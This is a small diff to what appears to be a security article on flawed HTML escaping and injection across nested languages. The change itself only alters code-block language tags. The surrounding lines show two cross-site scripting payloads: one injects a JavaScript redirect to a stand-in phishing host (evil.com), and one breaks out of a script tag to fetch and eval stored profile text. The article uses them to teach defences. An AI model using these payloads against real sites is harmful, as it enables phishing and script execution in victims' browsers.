@@ -76,7 +76,7 @@ satisfied.
 
 An adversary then enters this as their name:
 
-    :::
+    :::text
     A"+(window.location="https://evil.com/phishing-page")+"B
 
 `escapeHTML` dutifully searches for angle brackets and other HTML characters
@@ -182,7 +182,7 @@ to be bypassed by injecting the outer language. With division, parentheses,
 and dots allowed for arithmetic expressions, a whole remote-script loading
 injection can be composed:
 
-    :::
+    :::html
     </script><form>/me/profile</form><script>eval(JSON.parse(fetch(Array.from(document.forms).pop().textContent)).data.aboutMe)</script><script>
 
 Using `fetch` and `eval` allows it to post-process payloads from the site. For
